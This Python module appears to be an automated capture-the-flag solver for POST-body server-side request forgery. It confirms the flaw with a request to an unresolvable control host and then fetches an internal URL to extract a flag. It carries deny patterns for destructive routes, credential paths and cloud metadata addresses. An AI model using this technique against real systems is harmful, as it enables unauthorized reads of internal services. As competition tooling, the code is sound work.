#!/usr/bin/env python3
"""Exact-contract POST-body SSRF reader for web Layer 1.

This peer covers the JSON/form gap left by the GET/query SSRF waves. It runs
only when target-local clues or a preloaded OpenAPI document establish an exact
same-origin POST route, one exact URL field, JSON or form encoding, explicit
read/fetch semantics, and one exact internal destination (or internal route and
port). No route, field, method, media type, header, or destination is guessed.

The two-request wire sequence is terminal once begun: first send the same body
shape with ``http://ssrf-control.invalid/`` and require a concrete DNS/connect/
fetch error; then send the exact internal URL. There is no redirect following,
OOB callback, target-authored header, credential replay, inner-method choice,
DNS rebinding, or non-HTTP scheme. A result is returned only for one novel
exact payoff token (a proof under a proof event, else a flag; ctf.flagfmt) in the successful second response.
"""

from __future__ import annotations

import datetime as _dt
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402 -- sole production transport and URL authority
import security_json as _security_json  # noqa: E402 -- fail-closed policy JSON

try:
    import forge_event as _proofs  # noqa: E402 -- shared success/novelty policy
except Exception:  # pragma: no cover
    _proofs = None

BASELINE_INCOMPLETE = getattr(
    _proofs, "BASELINE_STRICT_INCOMPLETE",
    "<!-- csctf-baseline-strict-set:incomplete -->",
)


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 25.0
DEFAULT_MAX_REQUESTS = 4
DEADLINE_PAD = 0.3
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_BODY_BYTES = 16 * 1024
MAX_DOCS = 60
MAX_SCHEMA_DEPTH = 8

# The event's payoff token (ctf.flagfmt): a proof under a proof event, else a flag.
_PAYOFF_SEEN = flagfmt.PAYOFF_ANYCASE


def _payoffish(value) -> bool:
    """Payoff-shaped (any case, near-miss bodies) or the other family's shape: a candidate, never returned."""
    value = str(value)
    return bool(flagfmt.PAYOFF_SHAPE.fullmatch(value) or flagfmt.PAYOFF_OTHER.fullmatch(value)
                or _PAYOFF_SEEN.fullmatch(value))
_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_FETCH_WORDS = re.compile(
    r"(?i)\b(?:ssrf|server[ _-]?side[ _-]?(?:request|fetch)|url[ _-]?(?:fetch|preview|reader)|"
    r"fetch[ _-]?(?:url|uri|remote|resource)|remote[ _-]?(?:fetch|preview)|"
    r"proxy[ _-]?(?:url|fetch)|retrieve[ _-]?(?:url|resource))\b"
)
_CONTROL_ERROR = re.compile(
    r"(?i)\b(?:dns|name[ _-]?resolution|getaddrinfo|enotfound|nxdomain|could[ _-]?not[ _-]?resolve|"
    r"unknown[ _-]?host|host[ _-]?not[ _-]?found|connect(?:ion)?[ _-]?(?:failed|refused|error)|"
    r"unreachable|upstream[ _-]?(?:connect|fetch|network)?[ _-]?(?:failed|error)|"
    r"fetch[ _-]?(?:failed|error)|network[ _-]?error|timed?[ _-]?out|timeout)\b"
)
_ROUTE_ACTION_BOUNDARY = r"[/_\-.?&=;,+ ]"
_ROUTE_ACTION_OBJECT = (
    r"(?:users?|accounts?|profiles?|passwords?|credentials?|tokens?|sessions?|jobs?|tasks?|"
    r"records?|items?|files?|resources?|orders?|payments?|funds|money|roles?|permissions?|"
    r"groups?|members?|webhooks?|keys?|data|databases?|db|caches?|state|services?|process(?:es)?|"
    r"systems?|instances?|projects?|organizations?|orgs?)"
)
_FATAL_ROUTE = re.compile(
    rf"(?i)(?:^|{_ROUTE_ACTION_BOUNDARY})(?:login|signin|oauth|token|session|password|passwd|reset|recover|recovery|"
    r"redeem|issue|register|signup|delete|destroy|drop|wipe|purge|remove|truncate|erase|revoke|"
    r"logout|disable|deactivate|kill|shutdown|reboot|ban|suspend|cancel|transfer|pay|purchase|"
    rf"checkout|refund|approve|create|insert|upload|import|write|save|update|edit)(?=$|"
    rf"{_ROUTE_ACTION_BOUNDARY}|\d|{_ROUTE_ACTION_OBJECT}(?=$|{_ROUTE_ACTION_BOUNDARY}|\d))"
)
_FATAL_INNER = re.compile(
    rf"(?i)(?:^|{_ROUTE_ACTION_BOUNDARY})(?:delete|destroy|drop|wipe|purge|remove|truncate|erase|reset|revoke|"
    r"logout|disable|deactivate|kill|shutdown|reboot|ban|suspend|cancel|transfer|pay|purchase|"
    rf"checkout|refund|approve|create|insert|upload|import|write|save|update|edit)(?=$|"
    rf"{_ROUTE_ACTION_BOUNDARY}|\d|{_ROUTE_ACTION_OBJECT}(?=$|{_ROUTE_ACTION_BOUNDARY}|\d))"
)
_SENSITIVE_INNER = re.compile(
    r"(?i)(?:^|[/_.?&=-])(?:credentials?|secrets?|password|passwd|token|access[ _-]?token|"
    r"identity[ _-]?token|service[ _-]?accounts?|iam|user[ _-]?data)(?=$|[/_.?&=-]|\d)"
)
_METADATA_HOSTS = frozenset({
    "169.254.169.254", "169.254.170.2", "100.100.100.200",
    "fd00:ec2::254", "metadata.google.internal",
})

_ROUTE_KEYS = ("post_ssrf_route", "ssrf_route", "fetch_route", "preview_route", "feature_route")
_FIELD_KEYS = ("post_ssrf_field", "ssrf_field", "url_field", "uri_field", "body_field", "request_field")
_MEDIA_KEYS = ("post_ssrf_content_type", "ssrf_content_type", "request_content_type", "content_type", "media_type")
_METHOD_KEYS = ("post_ssrf_method", "ssrf_method", "request_method", "feature_method", "http_method", "method")
_INNER_KEYS = ("post_ssrf_internal_url", "ssrf_internal_url", "internal_url", "backend_url", "internal_resource")
_SECONDARY_KEYS = ("internal_route", "backend_route", "secondary_route")
_PORT_KEYS = ("internal_port", "backend_port", "service_port")
_HOST_KEYS = ("internal_host", "backend_host", "service_host")
_SCHEME_KEYS = ("internal_scheme", "backend_scheme")
_MEDIA = {"application/json": "json", "application/x-www-form-urlencoded": "form"}


def enabled() -> bool:
    raw = ctf_env.get("CTF_WEB_SSRF_BODY")
    if raw is not None:
        return raw.strip().lower() in ("on", "1", "true", "yes")
    try:
        root = ctf_paths.workdir()
        return not (root / "_ssrf_body.off").exists()
    except Exception:
        return False


def _snake(value) -> str:
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def _origin(value):
    try:
        p = urllib.parse.urlsplit(str(value or ""))
        if (p.scheme not in ("http", "https") or not p.hostname or p.username is not None
                or p.password is not None or p.fragment):
            return None
        return p.scheme, p.hostname.lower().rstrip("."), p.port or (443 if p.scheme == "https" else 80)
    except Exception:
        return None


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode()
        return out
    return None


def _text(response) -> str:
    if not isinstance(response, dict):
        return ""
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response)
            return str(views[0])[:MAX_TEXT] if views else ""
        except Exception:
            return ""
    value = response.get("body", response.get("text", ""))
    if isinstance(value, (bytes, bytearray)):
        return bytes(value[:MAX_TEXT]).decode("utf-8", "replace")
    return str(value or "")[:MAX_TEXT]


def _baseline_text(response) -> str:
    if _proofs is not None and hasattr(_proofs, "response_baseline_text"):
        return _proofs.response_baseline_text(response)
    text = _text(response)
    raw = response.get("response_headers", response.get("headers", {})) if isinstance(response, dict) else {}
    headers = "\n".join(str(v)[:4096] for v in raw.values()) if isinstance(raw, dict) else ""
    return (text + (("\n" + headers) if headers else ""))[:MAX_TEXT]


def _json(response, *, strict=True):
    views = None
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response, strict=strict)
        except Exception:
            return None
    try:
        value = _security_json.loads_unique(
            views if views is not None else [_text(response)], max_chars=MAX_TEXT)
        return value if isinstance(value, dict) else None
    except Exception:
        return None


def _flatten(value, depth=0):
    out = []
    stack = [value]
    while stack:
        item = stack.pop()
        if isinstance(item, dict):
            pairs = list(item.items())
            for key, child in pairs:
                out.append(str(key))
            stack.extend(child for _key, child in reversed(pairs))
        elif isinstance(item, list):
            stack.extend(reversed(item))
        elif isinstance(item, (str, int, float, bool)):
            out.append(str(item))
    return out


def _safe_route(value, base_url):
    try:
        route = _web.safe_same_origin_route(
            value, base_url, allow_query=False, guard_query=True, max_bytes=MAX_ROUTE_BYTES)
        if route is None:
            return None
        path = urllib.parse.urlsplit(route).path or "/"
        if any(ch in path for ch in "{}*"):
            return None
        layers = _web.canonical_route_layers(path, max_bytes=MAX_ROUTE_BYTES) or ()
        guarded_layers = []
        for layer in layers:
            guarded_layers.append(layer)
            guarded_layers.append(re.sub(r"([a-z0-9])([A-Z])", r"\1/\2", layer))
        if (any(_FATAL_ROUTE.search(layer) for layer in guarded_layers)
                or any(_web.route_has_destructive_action(layer) for layer in layers)):
            return None
        return route
    except Exception:
        return None


def _field_path(value):
    if not isinstance(value, str) or not value or len(value) > 256:
        return None
    if value.startswith("/"):
        raw = value.split("/")[1:]
        if any("~" in part for part in raw):
            return None
    else:
        raw = value.split(".")
    if not 1 <= len(raw) <= 5 or any(not _NAME.fullmatch(part) for part in raw):
        return None
    if any(_snake(part) in {"callback", "webhook", "header", "headers", "method", "token", "credential"}
           for part in raw):
        return None
    return tuple(raw)


def _first(documents, keys):
    for doc in documents:
        if not isinstance(doc, dict):
            continue
        for key in keys:
            value = doc.get(key)
            if isinstance(value, (str, int)) and not isinstance(value, bool):
                return value, key
    return None, None


def _preloaded_docs(preloaded, base_url):
    out = {}
    raw_keys = {}
    collided = set()
    items = list((preloaded or {}).items())
    if len(items) > MAX_DOCS:
        return {}
    for path, response in items:
        if not isinstance(path, str):
            continue
        route = _web.safe_preloaded_route_key(path, base_url, max_bytes=MAX_ROUTE_BYTES)
        if route is None or route in collided:
            continue
        if route in raw_keys and raw_keys[route] != path:
            out.pop(route, None)
            collided.add(route)
            continue
        raw_keys[route] = path
        normalized = _response(response)
        if (normalized is None or not isinstance(normalized.get("status"), int)
                or not 200 <= normalized["status"] < 300):
            continue
        # These documents can authorize a live POST. Any framing/carrier
        # integrity issue (unsafe archive sibling, truncation, malformed
        # encoding, cap exhaustion) invalidates the whole authority source.
        doc = _json(normalized, strict=True)
        if isinstance(doc, dict):
            out[route] = doc
    return out


def _local_ref(doc, value, seen=None):
    if not isinstance(value, dict):
        return None
    if "$ref" not in value:
        return value
    if set(value) != {"$ref"}:
        return None
    ref = value.get("$ref")
    if not isinstance(ref, str) or not ref.startswith("#/") or len(ref) > 512:
        return None
    seen = set(seen or ())
    if ref in seen or len(seen) >= MAX_SCHEMA_DEPTH:
        return None
    seen.add(ref)
    node = doc
    try:
        for raw in ref[2:].split("/"):
            token = raw.replace("~1", "/").replace("~0", "~")
            if not isinstance(node, dict) or token not in node:
                return None
            node = node[token]
    except Exception:
        return None
    return _local_ref(doc, node, seen)


def _request_schema(doc, operation, media):
    body = _local_ref(doc, operation.get("requestBody"))
    if not isinstance(body, dict) or body.get("required") is not True:
        return None
    content = body.get("content")
    raw = content.get(media) if isinstance(content, dict) else None
    return _local_ref(doc, raw.get("schema")) if isinstance(raw, dict) else None


def _schema_slot(doc, schema, path, depth=0):
    """Validate one string slot and reject unresolved required siblings."""
    if depth > MAX_SCHEMA_DEPTH:
        return False
    schema = _local_ref(doc, schema)
    if not isinstance(schema, dict) or any(key in schema for key in ("oneOf", "anyOf", "allOf", "not")):
        return False
    if not path:
        return schema.get("type") in (None, "string") and not isinstance(schema.get("enum"), list)
    if schema.get("type") not in (None, "object"):
        return False
    props = schema.get("properties")
    if not isinstance(props, dict) or path[0] not in props:
        return False
    required = schema.get("required") if isinstance(schema.get("required"), list) else []
    if any(name != path[0] for name in required):
        return False
    return _schema_slot(doc, props[path[0]], path[1:], depth + 1)


def _oas_support(doc, route, field, media):
    if not isinstance(doc, dict) or not isinstance(doc.get("paths"), dict):
        return False
    item = doc["paths"].get(urllib.parse.urlsplit(route).path)
    operation = item.get("post") if isinstance(item, dict) else None
    if not isinstance(operation, dict):
        return False
    security = operation.get("security", doc.get("security", []))
    if not isinstance(security, list) or security:
        return False
    params = []
    for owner in (item, operation):
        if "parameters" not in owner:
            continue
        rows = owner.get("parameters")
        if not isinstance(rows, list):
            return False
        for row in rows:
            resolved = _local_ref(doc, row)
            if not isinstance(resolved, dict):
                return False
            params.append(resolved)
    if any(row.get("required") is True for row in params):
        return False
    schema = _request_schema(doc, operation, media)
    return bool(schema and _schema_slot(doc, schema, field))


def _media(value):
    raw = str(value or "").split(";", 1)[0].strip().lower()
    return raw if raw in _MEDIA else None


def _safe_inner(value):
    try:
        result = _web.safe_internal_url(
            value, max_bytes=4096,
            destructive=lambda text: bool(
                _FATAL_INNER.search(str(text)) or _SENSITIVE_INNER.search(str(text))))
        if result is None or urllib.parse.urlsplit(result).scheme.lower() not in ("http", "https"):
            return None
        parts = urllib.parse.urlsplit(result)
        if (str(parts.hostname or "").lower().rstrip(".") in _METADATA_HOSTS
                or _SENSITIVE_INNER.search(parts.path + "?" + parts.query)):
            return None
        return result
    except Exception:
        return None


_MISSING = object()
_CONFLICT = object()


def _port_number(value):
    text = str(value)
    return int(text) if re.fullmatch(r"[0-9]{1,5}", text) else None


def _coherent(document, keys, normalizer, *, types=(str,)):
    values = []
    present = []
    for key in keys:
        if key not in document:
            continue
        present.append(key)
        raw = document.get(key)
        if not isinstance(raw, types) or isinstance(raw, bool):
            return _CONFLICT, present
        try:
            value = normalizer(raw)
        except Exception:
            return _CONFLICT, present
        if value is None:
            return _CONFLICT, present
        if value not in values:
            values.append(value)
    if not values:
        return _MISSING, present
    return (values[0] if len(values) == 1 else _CONFLICT), present


def _secondary_destination(document):
    secondary, secondary_keys = _coherent(
        document, _SECONDARY_KEYS,
        lambda value: value if (_web.safe_route_path(value, max_bytes=MAX_ROUTE_BYTES)
                                and "?" not in value and "#" not in value) else None)
    port, port_keys = _coherent(document, _PORT_KEYS, _port_number, types=(str, int))
    host, host_keys = _coherent(document, _HOST_KEYS, lambda value: str(value).strip())
    scheme, scheme_keys = _coherent(document, _SCHEME_KEYS, lambda value: value.strip().lower())
    any_component = bool(secondary_keys or port_keys or host_keys or scheme_keys)
    if not any_component:
        return _MISSING
    if secondary in (_MISSING, _CONFLICT) or port in (_MISSING, _CONFLICT):
        return _CONFLICT
    try:
        port_n = int(port)
    except (TypeError, ValueError, OverflowError):
        return _CONFLICT
    if not 1 <= port_n <= 65535:
        return _CONFLICT
    if host is _MISSING:
        host = "127.0.0.1"
    elif host is _CONFLICT:
        return _CONFLICT
    # A host field contains an address/name, not URL authority punctuation.
    # Requiring the unbracketed IPv6 form prevents double-bracket ambiguity.
    if host.startswith("[") or host.endswith("]") or not _web.internal_host(host):
        return _CONFLICT
    if scheme is _MISSING:
        scheme = "http"
    elif scheme is _CONFLICT:
        return _CONFLICT
    if scheme not in ("http", "https"):
        return _CONFLICT
    rendered_host = f"[{host}]" if ":" in host and not host.startswith("[") else host
    return _safe_inner(f"{scheme}://{rendered_host}:{port_n}{secondary}") or _CONFLICT


def _inner_destination(documents):
    if len(documents) != 1 or not isinstance(documents[0], dict):
        return None
    document = documents[0]
    direct, direct_keys = _coherent(document, _INNER_KEYS, _safe_inner)
    constructed = _secondary_destination(document)
    if direct is _CONFLICT or constructed is _CONFLICT:
        return None
    if direct is not _MISSING and constructed is not _MISSING:
        return direct if direct == constructed else None
    if direct is not _MISSING:
        return direct
    return None if constructed is _MISSING else constructed


def _contract(docs, base_url):
    clues = docs.get("/api/clues")
    if not isinstance(clues, dict):
        return None
    sources = [("clues", clues)]
    inventory = clues.get("inventory_route")
    if isinstance(inventory, str):
        route = _safe_route(inventory, base_url)
        if route and isinstance(docs.get(route), dict):
            sources.append(("linked-inventory", docs[route]))

    # Route, field, media, method and destination are one authority contract.
    # Never enrich a route-only clue with a second object's body shape or
    # internal destination. OpenAPI may independently validate that this one
    # complete non-OAS object's route/body really is an unauthenticated POST.
    candidates = []
    for source_name, authority in sources:
        prose = " ".join(_flatten(authority))[:100_000]
        exact = any(_snake(key).startswith(("post_ssrf", "ssrf_")) for key in authority)
        if not exact and not _FETCH_WORDS.search(prose):
            continue
        route, route_keys = _coherent(
            authority, _ROUTE_KEYS, lambda value: _safe_route(value, base_url))
        field, field_keys = _coherent(authority, _FIELD_KEYS, _field_path)
        media, media_keys = _coherent(authority, _MEDIA_KEYS, _media)
        method, method_keys = _coherent(
            authority, _METHOD_KEYS, lambda value: value.strip().upper())
        if (route in (_MISSING, _CONFLICT) or field in (_MISSING, _CONFLICT)
                or media in (_MISSING, _CONFLICT) or method is _CONFLICT
                or (method is not _MISSING and method != "POST")):
            continue
        if media == "application/x-www-form-urlencoded" and len(field) != 1:
            continue
        oas = any(_oas_support(doc, route, field, media) for doc in docs.values())
        exact_keys = any(key.startswith(("post_ssrf", "ssrf_")) for key in route_keys) \
            and any(key.startswith(("post_ssrf", "ssrf_")) for key in field_keys)
        explicit_transport = method == "POST" and bool(method_keys) and bool(media_keys)
        if not (exact_keys or explicit_transport or oas):
            continue
        inner = _inner_destination([authority])
        if inner is None:
            continue
        candidates.append({
            "route": route, "field": field, "media": media, "inner": inner,
            "source": ("ssrf-keys" if exact_keys else
                       "openapi" if oas else source_name),
        })

    unique = {}
    for candidate in candidates:
        key = (candidate["route"], candidate["field"], candidate["media"], candidate["inner"])
        unique.setdefault(key, candidate)
    return next(iter(unique.values())) if len(unique) == 1 else None


def _linked_inventory(docs, base_url):
    """One exact contract document linked by an already-SSRF-specific clue."""
    clues = docs.get("/api/clues")
    if not isinstance(clues, dict):
        return None
    prose = " ".join(_flatten(clues))[:50_000]
    exact = any(_snake(key).startswith(("post_ssrf", "ssrf_")) for key in clues)
    if not exact and not _FETCH_WORDS.search(prose):
        return None
    route = _safe_route(clues.get("inventory_route"), base_url)
    return route if route and route not in docs else None


def _payload(field, value, media):
    if media == "application/x-www-form-urlencoded":
        return urllib.parse.urlencode([(field[0], value)])
    root = cursor = {}
    for name in field[:-1]:
        child = {}
        cursor[name] = child
        cursor = child
    cursor[field[-1]] = value
    return json.dumps(root, separators=(",", ":"), ensure_ascii=False)


def _control_confirmed(response):
    if not isinstance(response, dict) or not isinstance(response.get("status"), int):
        return False
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response)
        except Exception:
            views = []
    else:
        views = [_text(response)]
    # Generic "timeout" or "upstream failed" prose can describe any backend
    # condition.  The negative control authorizes the internal POST only when
    # the same coherent response view also identifies the exact nonce host we
    # supplied; never correlate across MIME/archive siblings.
    return any("ssrf-control.invalid" in str(view).lower()
               and _CONTROL_ERROR.search(str(view)) for view in list(views or [])[:256])


class _Runner:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None \
                else time.time() + DEFAULT_SECONDS
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        supplied_baselines = list(self.ctx.get("baseline_texts") or [])
        self.baselines = [str(v or "")[:MAX_TEXT] for v in supplied_baselines[:60]]
        preloaded_values = list(self.preloaded.values())
        if ((len(supplied_baselines) > 60 or len(preloaded_values) > 60)
                and BASELINE_INCOMPLETE not in self.baselines):
            self.baselines.append(BASELINE_INCOMPLETE)
        for response in preloaded_values[:60]:
            normalized = _response(response)
            if normalized is not None:
                self.baselines.append(_baseline_text(normalized))
        self.requests = self.posts = 0
        self.success = self.confirmed = self.terminal = self.uuid4 = False
        self.candidates, self.findings, self.responses = [], [], []
        self.where = self.stopped = None
        self.t0 = time.time()
        self.client = None
        self._gate = threading.Lock()
        self._stopped = False

    def _may_send(self):
        if self._stopped or (hasattr(self.external_stop, "is_set") and self.external_stop.is_set()):
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.deadline is not None and self.deadline - time.time() <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _client(self):
        if self.client is not None:
            return self.client
        try:
            candidate = self.ctx.get("client")
            if candidate is None and callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
            if candidate is None:
                candidate = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
            client_origin = _origin(getattr(candidate, "base", None))
            target_origin = _origin(self.url)
            if client_origin is None or target_origin is None or client_origin != target_origin:
                self.stopped = "client scope mismatch"
                return None
            self.client = candidate
            return candidate
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"
            return None

    def stop_now(self):
        with self._gate:
            self._stopped = True

    def post(self, route, body, media, role):
        if len(body.encode("utf-8", "replace")) > MAX_BODY_BYTES:
            self.stopped = self.stopped or "oversized SSRF body"
            return None
        safe = _safe_route(route, self.url)
        if safe is None:
            self.stopped = self.stopped or "unsafe SSRF route"
            return None
        with self._gate:
            client = self._client()
            if client is None or not self._may_send():
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            except Exception:
                pass
            self.requests += 1
            self.posts += 1
            self.terminal = True
            try:
                response = client.request("POST", safe, data=body, headers={"Content-Type": media},
                                          allow_redirects=False)
            except Exception as exc:
                self.responses.append({"role": role, "path": safe, "status": None,
                                       "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
            response = _response(response)
            self.responses.append({"role": role, "path": safe,
                                   "status": response.get("status") if response else None})
            return response

    def get(self, route, role):
        safe = _safe_route(route, self.url)
        if safe is None:
            self.stopped = self.stopped or "unsafe SSRF inventory route"
            return None
        with self._gate:
            client = self._client()
            if client is None or not self._may_send():
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            except Exception:
                pass
            self.requests += 1
            try:
                response = client.request("GET", safe, allow_redirects=False)
            except Exception as exc:
                self.responses.append({"role": role, "path": safe, "status": None,
                                       "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
            response = _response(response)
            self.responses.append({"role": role, "path": safe,
                                   "status": response.get("status") if response else None})
            return response

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        if _proofs is None:
            self.stopped = "shared proof classifier unavailable"
            return None
        docs = _preloaded_docs(self.preloaded, self.url)
        contract = _contract(docs, self.url)
        linked = _linked_inventory(docs, self.url) if contract is None else None
        if linked is not None:
            if self.max_requests - self.requests < 3 or not self._may_send():
                self.stopped = self.stopped or "insufficient budget for SSRF inventory and controls"
                return None
            route_allowed = self.ctx.get("route_allowed")
            if callable(route_allowed):
                try:
                    if not route_allowed(linked):
                        self.stopped = "caller route policy refused SSRF inventory"
                        return None
                except Exception:
                    self.stopped = "caller route policy failed closed"
                    return None
            inventory = self.get(linked, "contract-inventory")
            inventory_doc = _json(inventory)
            if (inventory is None or not isinstance(inventory.get("status"), int)
                    or not 200 <= inventory["status"] < 300 or not isinstance(inventory_doc, dict)):
                self.stopped = self.stopped or "linked SSRF inventory was not usable JSON"
                return None
            self.baselines.append(_baseline_text(inventory))
            docs[linked] = inventory_doc
            contract = _contract(docs, self.url)
        if contract is None:
            self.stopped = "no exact POST-body SSRF contract"
            return None
        route_allowed = self.ctx.get("route_allowed")
        if callable(route_allowed):
            try:
                if not route_allowed(contract["route"]):
                    self.stopped = "caller route policy refused SSRF route"
                    return None
            except Exception:
                self.stopped = "caller route policy failed closed"
                return None
        if self.max_requests - self.requests < 2 or not self._may_send() or self._client() is None:
            self.stopped = self.stopped or "insufficient budget for SSRF controls"
            return None
        control_body = _payload(contract["field"], "http://ssrf-control.invalid/", contract["media"])
        control = self.post(contract["route"], control_body, contract["media"], "unresolvable-control")
        if control is None:
            self.stopped = self.stopped or "SSRF control failed"
            return None
        self.baselines.append(_baseline_text(control))
        if not _control_confirmed(control):
            self.stopped = "unresolvable control did not prove a server-side fetch"
            return None
        self.confirmed = True
        payoff_body = _payload(contract["field"], contract["inner"], contract["media"])
        payoff = self.post(contract["route"], payoff_body, contract["media"], "internal-read")
        if payoff is None:
            self.stopped = self.stopped or "internal SSRF read failed"
            return None
        info = _proofs.extract_success(payoff, self.baselines,
                                       host=urllib.parse.urlsplit(self.url).hostname)
        safe_candidates = []
        values = list(info.get("candidates") or [])
        if not info.get("auto"):
            values += list(info.get("wire") or [])
        for value in values:
            if _payoffish(value) and str(value) not in safe_candidates:
                safe_candidates.append(str(value)[:256])
        self.candidates = safe_candidates[:12]
        self.success = bool(info.get("success") and (info.get("auto") or self.candidates))
        self.uuid4 = bool(info.get("uuid4"))
        self.where = "post-body-ssrf"
        self.findings.append({"class": "post_body_ssrf", "confirmed": self.confirmed,
                              "evidence": "invalid_host_fetch_error_then_internal_response",
                              "path": contract["route"], "field": ".".join(contract["field"]),
                              "media_type": contract["media"], "contract_source": contract["source"]})
        if info.get("auto") and not self.candidates:
            return info["auto"]
        self.stopped = ("SSRF payoff surfaced ambiguous/future-format evidence" if self.candidates
                        else "SSRF fetch confirmed without a proof-bearing payoff")
        return None

    def summary(self, proof):
        return {"proof": proof, "class": "post_body_ssrf", "success": self.success,
                "confirmed": self.confirmed, "terminal": self.terminal,
                "candidates": list(dict.fromkeys(self.candidates))[:12], "uuid4": self.uuid4,
                "baseline_incomplete": (_proofs.baseline_set_incomplete(self.baselines)
                                        if _proofs is not None
                                        and hasattr(_proofs, "baseline_set_incomplete") else True),
                "baseline_proofs": list(dict.fromkeys(match.group(0) for text in self.baselines
                                                       for match in _PAYOFF_SEEN.finditer(str(text or ""))))[:24],
                "requests": self.requests, "posts": self.posts,
                "seconds": round(time.time() - self.t0, 3), "where": self.where,
                "stopped": self.stopped, "findings": self.findings[:8],
                "responses": self.responses[:8]}


def _surface(runner, ctx):
    evidence = ctx.get("evidence") if isinstance(ctx, dict) else None
    if not isinstance(evidence, list):
        return
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        line = _web.safe_display_text(
            f"WEB POST-SSRF CANDIDATE {aid}: {value} (internal read; not auto-submitted)", 600)
        if line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises and never submits."""
    ctx = dict(ctx) if isinstance(ctx, dict) else {}
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    aid = runner.target.get("answer_id") or "target"
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    out = {}
    try:
        items = list(targets or [])
    except TypeError:
        return out
    for index, target in enumerate(items):
        if not isinstance(target, dict):
            continue
        item = dict(target)
        aid = str(item.get("answer_id") or item.get("id") or f"target-{index + 1}")
        item["answer_id"] = aid
        out[aid] = solve(item, ctx)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "ssrf_body.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
